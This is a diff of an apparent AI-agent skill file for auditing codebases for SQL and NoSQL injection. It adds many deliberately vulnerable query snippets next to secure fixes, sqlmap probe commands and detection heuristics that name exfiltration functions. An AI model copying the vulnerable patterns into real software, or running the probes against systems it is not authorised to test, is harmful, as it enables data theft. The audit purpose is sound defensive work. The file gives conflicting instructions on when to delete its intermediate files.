@@ -116,11 +428,12 @@ if sort_col not in ALLOWED_COLUMNS:
 query = f"SELECT * FROM products ORDER BY {sort_col}"  # safe only after allowlist check
 ```
 
----
+***
 
 ## Vulnerable vs. Secure Examples
 
 ### Python — Django (raw SQL)
+[ref: #sqli-ex-django-raw]
 
 ```python
 # VULNERABLE: f-string interpolation in raw()
@@ -137,6 +450,7 @@ def search_users(request):
 ```
 
 ### Python — Flask / SQLAlchemy
+[ref: #sqli-ex-flask-sqlalchemy]
 
 ```python
 # VULNERABLE: f-string into text()
@@ -156,7 +470,51 @@ def search():
     return jsonify(result.fetchall())
 ```
 
+### Python — FastAPI / SQLAlchemy 2.0 (async)
+[ref: #sqli-ex-fastapi-async]
+
+```python
+from fastapi import FastAPI, Depends
+from sqlalchemy import text, select
+from sqlalchemy.ext.asyncio import AsyncSession
+
+app = FastAPI()
+
+# VULNERABLE: f-string into text() inside an async endpoint
+@app.get("/users")
+async def get_user(name: str, db: AsyncSession = Depends(get_db)):
+    result = await db.execute(text(f"SELECT * FROM users WHERE name = '{name}'"))
+    return result.all()
+
+# SECURE: bound parameter via text() + execution-time mapping
+@app.get("/users")
+async def get_user(name: str, db: AsyncSession = Depends(get_db)):
+    result = await db.execute(text("SELECT * FROM users WHERE name = :name"), {"name": name})
+    return result.all()
+
+# SECURE: SQLAlchemy 2.0 select() construct (preferred — no raw SQL at all)
+@app.get("/users")
+async def get_user(name: str, db: AsyncSession = Depends(get_db)):
+    result = await db.execute(select(User).where(User.name == name))
+    return result.scalars().all()
+```
+
+```python
+import asyncpg
+
+# VULNERABLE
+await conn.fetch(f"SELECT * FROM users WHERE name = '{name}'")
+
+# SECURE: asyncpg uses positional $1, $2, … placeholders
+await conn.fetch("SELECT * FROM users WHERE name = $1", name)
+```
+
+`aiosqlite` mirrors the stdlib `sqlite3` module and uses `?` positional placeholders.
+
 ### Python — sqlite3 / psycopg2
+[ref: #sqli-ex-sqlite3-psycopg2]
+
+> **Driver note:** `psycopg` (v3) is the current PostgreSQL driver — same `%s` placeholder style as `psycopg2`, which is now legacy. `psycopg` v3 also supports server-side binding via `ClientCursor` and `AsyncConnection` for async code.
 
 ```python
 # VULNERABLE
@@ -171,6 +529,7 @@ def get_user(username):
 ```
 
 ### Node.js — mysql2
+[ref: #sqli-ex-nodejs-mysql2]
 
 ```javascript
 // VULNERABLE: template literal in query string
@@ -189,6 +548,7 @@ app.get('/user', async (req, res) => {
 ```
 
 ### Node.js — pg (PostgreSQL)
+[ref: #sqli-ex-nodejs-pg]
 
 ```javascript
 // VULNERABLE
@@ -207,6 +567,7 @@ app.get('/orders', async (req, res) => {
 ```
 
 ### Ruby on Rails
+[ref: #sqli-ex-rails]
 
 ```ruby
 # VULNERABLE: string interpolation in where()
@@ -227,6 +588,7 @@ end
 ```
 
 ### Java — Spring JDBC
+[ref: #sqli-ex-spring-jdbc]
 
 ```java
 // VULNERABLE: string concatenation
@@ -244,6 +606,7 @@ public User findUser(String username) {
 ```
 
 ### Java — Hibernate / JPA native query
+[ref: #sqli-ex-hibernate-native]
 
 ```java
 // VULNERABLE: concatenation into native query
@@ -262,6 +625,7 @@ public User findUserById(String id) {
 ```
 
 ### Go — database/sql
+[ref: #sqli-ex-go-database-sql]
 
 ```go
 // VULNERABLE: fmt.Sprintf to build query
@@ -279,6 +643,7 @@ func GetUserByName(name string) (*User, error) {
 ```
 
 ### PHP — PDO
+[ref: #sqli-ex-php-pdo]
 
 ```php
 // VULNERABLE: string concatenation
@@ -296,6 +661,7 @@ function getUser($id) {
 ```
 
 ### PHP — Laravel / Eloquent
+[ref: #sqli-ex-php-laravel]
 
 ```php
 // VULNERABLE: DB::raw with interpolation
@@ -313,6 +679,7 @@ $users = User::orderBy($sort)->get();
 ```
 
 ### C# — ADO.NET
+[ref: #sqli-ex-csharp-adonet]
 
 ```csharp
 // VULNERABLE: string concatenation
@@ -332,6 +699,7 @@ public User GetUser(string username) {
 ```
 
 ### C# — Entity Framework
+[ref: #sqli-ex-csharp-ef]
 
 ```csharp
 // VULNERABLE: FromSqlRaw with interpolation
@@ -348,7 +716,40 @@ context.Database.ExecuteSqlRaw("UPDATE Users SET Role = @role WHERE Id = @id",
     new SqlParameter("@role", role), new SqlParameter("@id", id));
 ```
 
+### ORM kwargs key injection (Django `filter(**kwargs)`, Prisma `orderBy`)
+[ref: #sqli-ex-orm-kwargs-injection]
+
+Dictionary/object expansion into ORM methods lets attackers inject internal control **keys** — not values — that alter query logic. CVE-2025-64459 (Django, patched November 2025): user-controlled keys passed via `**kwargs` into `filter()`/`exclude()`/`get()`/`Q()` could set undocumented internal arguments `_connector` (flips AND/OR) or `_negated` (toggles negation), enabling data exfiltration and authentication bypass.
+
+```python
+# VULNERABLE: user-controlled dict expanded into the ORM
+def search(request):
+    filters = request.GET.dict()          # attacker adds _connector=OR&_negated=True
+    return User.objects.filter(**filters)
+
+# SECURE: allowlist keys and map them explicitly
+ALLOWED = {"name", "email", "status"}
+def search(request):
+    filters = {k: v for k, v in request.GET.dict().items() if k in ALLOWED}
+    return User.objects.filter(**filters)
+```
+
+```javascript
+// VULNERABLE: raw unsafe methods and unvalidated dynamic objects
+await prisma.$queryRawUnsafe(`SELECT * FROM users WHERE name = '${name}'`);
+await prisma.user.findMany({ orderBy: { [req.query.sort]: "asc" } }); // attacker sorts by hidden fields
+
+// SECURE: parameterized raw tag and an orderBy allowlist
+await prisma.$queryRaw`SELECT * FROM users WHERE name = ${name}`;
+const SORTABLE = new Set(["name", "createdAt"]);
+const sort = SORTABLE.has(req.query.sort) ? req.query.sort : "createdAt";
+await prisma.user.findMany({ orderBy: { [sort]: "asc" } });
+```
+
+Detection signal: any `filter(**user_dict)`, `Q(**user_dict)`, `$queryRawUnsafe`/`$executeRawUnsafe`, or dynamic `orderBy`/`where` object built from request data without a key allowlist.
+
 ### Dynamic ORDER BY / Column Names (all stacks)
+[ref: #sqli-ex-dynamic-order-by]
 
 ```python
 # VULNERABLE: unsanitized user input as column name (parameterization can't help here)
@@ -364,6 +765,7 @@ cursor.execute(f"SELECT * FROM products ORDER BY {sort_col}")
 ```
 
 ### GraphQL resolver SQLi (Node.js / pg)
+[ref: #sqli-ex-graphql-nodejs]
 
 ```javascript
 // VULNERABLE: resolver argument interpolated into raw SQL
@@ -388,6 +790,7 @@ const resolvers = {
 ```
 
 ### GraphQL resolver SQLi (Python / Graphene + SQLAlchemy)
+[ref: #sqli-ex-graphql-python]
 
 ```python
 # VULNERABLE
@@ -408,6 +811,7 @@ class Query(graphene.ObjectType):
 ```
 
 ### GraphQL resolver SQLi (Java / graphql-java + JDBC)
+[ref: #sqli-ex-graphql-java]
 
 ```java
 // VULNERABLE
@@ -426,6 +830,7 @@ DataFetcher<User> userFetcher = env -> {
 ```
 
 ### Stored procedure SQLi (PL/SQL example)
+[ref: #sqli-ex-stored-proc-plsql]
 
 ```sql
 -- VULNERABLE: dynamic SQL built inside the procedure
@@ -442,6 +847,7 @@ END;
 ```
 
 ### Stored procedure SQLi (T-SQL example)
+[ref: #sqli-ex-stored-proc-tsql]
 
 ```sql
 -- VULNERABLE
@@ -461,6 +867,7 @@ END
 ```
 
 ### Stored procedure SQLi (MySQL example)
+[ref: #sqli-ex-stored-proc-mysql]
 
 ```sql
 -- VULNERABLE
@@ -483,6 +890,7 @@ END
 ```
 
 ### Batch / stacked query injection (Node.js / pg)
+[ref: #sqli-ex-stacked-queries]
 
 ```javascript
 // VULNERABLE: raw string allows stacked statements when multi-statement mode is enabled
@@ -504,6 +912,7 @@ app.post('/update', async (req, res) => {
 ```
 
 ### Second-order SQLi (Python / Django)
+[ref: #sqli-ex-second-order]
 
 ```python
 # VULNERABLE: user-supplied display_name is stored safely, then used unsafely later
@@ -519,6 +928,7 @@ def admin_report(request):
 ```
 
 ### NoSQL injection — MongoDB (Node.js / Mongoose)
+[ref: #sqli-ex-nosql-mongodb]
 
 ```javascript
 // VULNERABLE: req.body.username can be an object like { "$ne": null }
@@ -537,6 +947,7 @@ app.post('/login', async (req, res) => {
 ```
 
 ### NoSQL injection — DynamoDB (Python / boto3)
+[ref: #sqli-ex-nosql-dynamodb]
 
 ```python
 # VULNERABLE: user input concatenated into KeyConditionExpression
@@ -553,6 +964,7 @@ response = table.query(
 ```
 
 ### NoSQL injection — Elasticsearch (Python)
+[ref: #sqli-ex-nosql-elasticsearch]
 
 ```python
 # VULNERABLE: user input concatenated into query DSL
@@ -565,9 +977,55 @@ res = es.search(index="products", body={
 })
 ```
 
----
+***
+
+### NoSQL injection — Neo4j Cypher / Cassandra CQL / Redis Lua / ClickHouse
+[ref: #sqli-ex-nosql-wide]
+
+```python
+# Neo4j — VULNERABLE: input concatenated into Cypher
+query = "MATCH (n:User {username: '" + user_input + "'}) RETURN n"
+graph.run(query)
+
+# Neo4j — SECURE: parameters treat input as data
+query = "MATCH (n:User {username: $username}) RETURN n"
+graph.run(query, username=user_input)
+```
+
+```python
+# Cassandra — VULNERABLE: input concatenated into CQL
+cql = "SELECT * FROM users WHERE username = '" + user_input + "';"
+session.execute(cql)
+
+# Cassandra — SECURE: prepared statement with placeholder
+query = "SELECT * FROM users WHERE username = ?;"
+session.execute(query, [user_input])
+```
+
+```python
+# Redis — VULNERABLE: input concatenated into an EVAL script body
+script = "return redis.call('GET', '" + user_input + "')"
+redis_client.eval(script, 0)
+
+# Redis — SECURE: dynamic values passed via KEYS/ARGV, never interpolated
+script = "return redis.call('GET', KEYS[1])"
+redis_client.eval(script, 1, user_input)
+```
+
+```python
+# ClickHouse — VULNERABLE: user-controlled column/expression interpolation (identifiers cannot be parameterized)
+query = "SELECT " + user_supplied_column + " FROM events ORDER BY timestamp"
+client.execute(query)
+
+# ClickHouse — SECURE: allowlist identifiers before interpolating
+allowed_columns = ["id", "timestamp", "event_name"]
+if user_supplied_column in allowed_columns:
+    query = f"SELECT {user_supplied_column} FROM events ORDER BY timestamp"
+    client.execute(query)
+```
 
 ## SQLi Variant Taxonomy
+[ref: #sqli-variant-taxonomy]
 
 In addition to classic relational SQLi, subagents should flag these API-relevant variants when the architecture indicates the corresponding technology is in use.
 
@@ -588,6 +1046,7 @@ In addition to classic relational SQLi, subagents should flag these API-relevant
 | Out-of-band (OOB) | DNS/HTTP exfiltration payloads | Database functions such as `LOAD_FILE`, `UTL_HTTP`, `xp_dirtree` reachable from injectable parameter. |
 
 ### Detection heuristics per variant
+[ref: #sqli-detection-heuristics]
 
 **Classic relational SQLi**
 - Look for SQL keywords (`SELECT`, `INSERT`, `UPDATE`, `DELETE`, `WHERE`, `ORDER BY`) in string literals that are built with `+`, `.format`, f-strings, template literals, `sprintf`, `String.format`, or interpolation.
@@ -631,14 +1090,15 @@ In addition to classic relational SQLi, subagents should flag these API-relevant
 - Endpoints whose response content depends on the truth of a SQL predicate.
 - Time-delay detectability: network baseline must be established; compare response times for `SLEEP(0)` vs `SLEEP(5)`.
 
----
+***
 
 ## ORM Unsafe-Pattern Cheat Sheet
+[ref: #sqli-orm-cheat-sheet]
 
 | Stack | Unsafe pattern | Safer alternative |
 | --- | --- | --- |
 | Python/Django | `User.objects.raw(f"SELECT * FROM app_user WHERE id = {uid}")` | `User.objects.raw("SELECT * FROM app_user WHERE id = %s", [uid])` |
-| Python/Django | `User.objects.extra(where=[f"name = '{name}'"])` | `User.objects.filter(name=name)` or `extra(where=["name = %s"], params=[name])` |
+| Python/Django | `User.objects.extra(where=[f"name = '{name}'"])` (`.extra()` deprecated since Django 1.9 — use `annotate()`/`Func` expressions instead) | `User.objects.filter(name=name)` or `extra(where=["name = %s"], params=[name])` |
 | Python/SQLAlchemy | `session.execute(text(f"SELECT * FROM users WHERE id = {uid}"))` | `session.execute(text("SELECT * FROM users WHERE id = :id"), {"id": uid})` |
 | Java/Hibernate | `createNativeQuery("SELECT * FROM users WHERE id = " + id)` | `createNativeQuery("SELECT * FROM users WHERE id = ?1").setParameter(1, id)` |
 | Java/Hibernate | `createQuery("SELECT u FROM User u WHERE u.name = '" + name + "'")` | `createQuery("SELECT u FROM User u WHERE u.name = :name").setParameter("name", name)` |
@@ -652,13 +1112,15 @@ In addition to classic relational SQLi, subagents should flag these API-relevant
 | PHP/Laravel | `DB::raw("... {$input} ...")` | `DB::raw("... ? ...", [$input])` or query builder |
 | C# / EF Core | `FromSqlRaw($"SELECT ... {name}")` | `FromSqlRaw("SELECT ... {0}", name)` or `FromSqlInterpolated($"... {name}")` |
 
----
+***
 
 ## Dynamic-Test Payload Library
+[ref: #sqli-payload-library]
 
 Subagents should include these probes in dynamic-test templates. Always pair manual tests with a sqlmap run when the endpoint is reachable and legal to test.
 
 ### MySQL / MariaDB
+[ref: #sqli-payloads-mysql]
 
 ```sql
 -- Error / union-based
@@ -682,6 +1144,7 @@ sqlmap -u "https://app.example.com/api/search?q=test" -p q --batch --dbs
 ```
 
 ### PostgreSQL
+[ref: #sqli-payloads-postgresql]
 
 ```sql
 -- Error / union-based
@@ -705,6 +1168,7 @@ sqlmap -u "https://app.example.com/api/orders?status=test" -p status --dbms=post
 ```
 
 ### Microsoft SQL Server
+[ref: #sqli-payloads-mssql]
 
 ```sql
 -- Error / union-based
@@ -728,6 +1192,7 @@ sqlmap -u "https://app.example.com/api/report?id=1" -p id --dbms=mssql --batch -
 ```
 
 ### Oracle
+[ref: #sqli-payloads-oracle]
 
 ```sql
 -- Error / union-based
@@ -750,6 +1215,7 @@ sqlmap -u "https://app.example.com/api/users?name=test" -p name --dbms=oracle --
 ```
 
 ### SQLite
+[ref: #sqli-payloads-sqlite]
 
 ```sql
 -- Error / union-based
@@ -766,6 +1232,7 @@ sqlmap -u "https://app.example.com/api/users?name=test" -p name --dbms=oracle --
 ```
 
 ### NoSQL injection probes
+[ref: #sqli-payloads-nosql]
 
 ```json
 // MongoDB operator injection
@@ -786,6 +1253,7 @@ sqlmap -u "https://app.example.com/api/users?name=test" -p name --dbms=oracle --
 ```
 
 ### GraphQL resolver probe
+[ref: #sqli-payloads-graphql]
 
 ```graphql
 query {
@@ -796,13 +1264,15 @@ query {
 }
 ```
 
----
+***
 
 ## Execution
+[ref: #sqli-execution-intro]
 
 This skill runs in three phases using subagents. Pass the contents of `{{ REPORTS_ROOT }}/01_architecture.md` to all subagents as context.
 
 ### Phase 1: Recon — Find Vulnerable SQL Construction Sites
+[ref: #sqli-phase1-recon]
 
 Launch a subagent with the following instructions:
 
@@ -889,6 +1359,7 @@ Launch a subagent with the following instructions:
 > ```
 
 ### After Phase 1: Check for Candidates Before Proceeding
+[ref: #sqli-phase1-gate]
 
 After Phase 1 completes, read `{{ REPORTS_ROOT }}/02_recon.md`. If the recon found **zero vulnerable construction sites** (the summary reports "Found 0" or the "Vulnerable Construction Sites" section is empty or absent), **skip Phase 2 entirely**. Instead, write the following content to `{{ REPORTS_ROOT }}/02_sqli.md` and stop:
 
@@ -901,6 +1372,7 @@ No vulnerabilities found.
 Only proceed to Phase 2 if Phase 1 found at least one vulnerable construction site.
 
 ### Phase 2: Verify — Taint Analysis (Batched)
+[ref: #sqli-phase2-verify]
 
 After Phase 1 completes, read `{{ REPORTS_ROOT }}/02_recon.md` and split the construction sites into **batches of up to 3 sites each**. Launch **one subagent per batch in parallel**. Each subagent traces user input only for its assigned sites and writes results to its own batch file.
 
@@ -951,7 +1423,7 @@ Give each batch subagent the following instructions (substitute the batch-specif
 > **Mitigations** (check even if user input might reach the variable):
 > - Allowlist validation before use (especially for dynamic identifiers — column/table names, `ORDER BY`)
 > - Type casts that genuinely constrain the value in context (e.g., `int(val)` in purely numeric SQL fragments)
-> - Custom escaping (`mysql_real_escape_string`, `addslashes`, homegrown sanitizers) is **not** equivalent to parameterization — still classify as Likely Vulnerable if taint is present
+> - Custom escaping (`mysql_real_escape_string` — removed in PHP 7, historical only — `addslashes`, homegrown sanitizers) is **not** equivalent to parameterization — still classify as Likely Vulnerable if taint is present
 >
 > **Vulnerable vs. Secure examples for this project's tech stack**:
 >
@@ -1018,6 +1490,7 @@ Give each batch subagent the following instructions (substitute the batch-specif
 > ```
 
 ### Phase 3: Merge — Consolidate Batch Results
+[ref: #sqli-phase3-merge]
 
 After **all** Phase 2 batch subagents complete, read every `{{ REPORTS_ROOT }}/02_batch_*.md` file and merge them into a single `{{ REPORTS_ROOT }}/02_sqli.md`. You (the orchestrator) do this directly — no subagent needed.
 
@@ -1047,9 +1520,10 @@ After **all** Phase 2 batch subagents complete, read every `{{ REPORTS_ROOT }}/0
 
 5. After writing `{{ REPORTS_ROOT }}/02_sqli.md`, **delete all intermediate batch files** (`{{ REPORTS_ROOT }}/02_batch_*.md`).
 
----
+***
 
 ## OWASP API Security Top 10 2023 mapping
+[ref: #sqli-owasp-mapping]
 
 The official OWASP API Security Top 10 2023 does **not** contain a standalone "Injection" category. SQL injection in APIs should be reported through its root-cause risk.
 
@@ -1073,9 +1547,10 @@ This scan supports the following OWASP API Security Top 10 2023 risks:
 
 Each finding in `{{ REPORTS_ROOT }}/02_sqli.md` must include an **OWASP API 2023 root-cause risk** field explaining which risk(s) the finding represents.
 
----
+***
 
 ## CWE references
+[ref: #sqli-cwe-references]
 
 Map findings to the CWE taxonomy when the root cause is clear:
 
@@ -1089,9 +1564,10 @@ Map findings to the CWE taxonomy when the root cause is clear:
 
 When a single finding involves multiple weaknesses (e.g., missing validation plus unsafe concatenation), list the most specific SQLi CWE first, followed by supporting CWEs.
 
----
+***
 
 ## Important Reminders
+[ref: #sqli-reminders]
 
 - Read `{{ REPORTS_ROOT }}/01_architecture.md` and pass its content to all subagents as context.
 - **This is a read-only audit.** Do not modify project source code, configuration files, test data, or any other project file. Subagents must only read and report.
@@ -1112,9 +1588,10 @@ When a single finding involves multiple weaknesses (e.g., missing validation plu
 - Preserve intermediate files (`{{ REPORTS_ROOT }}/02_recon.md` and all `{{ REPORTS_ROOT }}/02_batch_*.md`) until the final consolidated report (`{{ REPORTS_ROOT }}/report.md`) has been written. Delete them only after `references/99-report.md` has finished and the orchestrator confirms no further reads are needed.
 - Clean up intermediate files: delete `{{ REPORTS_ROOT }}/02_recon.md` and all `{{ REPORTS_ROOT }}/02_batch_*.md` files after the final `{{ REPORTS_ROOT }}/report.md` is written.
 
----
+***
 
 ## References
+[ref: #sqli-references]
 
 - OWASP API Security Top 10 2023 — [API8:2023 Security Misconfiguration](0xa8-security-misconfiguration.md)
 - OWASP API Security Top 10 2023 — [API10:2023 Unsafe Consumption of APIs](0xaa-unsafe-consumption-of-apis.md)
